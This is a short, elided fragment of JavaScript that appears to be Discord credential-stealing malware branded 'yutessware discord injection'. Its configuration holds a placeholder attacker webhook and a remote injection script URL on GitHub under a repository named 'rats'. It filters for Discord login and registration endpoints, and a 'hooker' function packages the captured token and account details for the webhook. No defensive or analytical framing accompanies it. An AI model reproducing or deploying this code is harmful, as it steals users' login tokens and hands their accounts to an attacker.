...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/Diqlsdqwesaw/rats/refs/heads/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "yutessware - cord injection";
    ...
    content["embeds"][0]["footer"] = {
        "text": "yutessware discord injection - made by yutess",
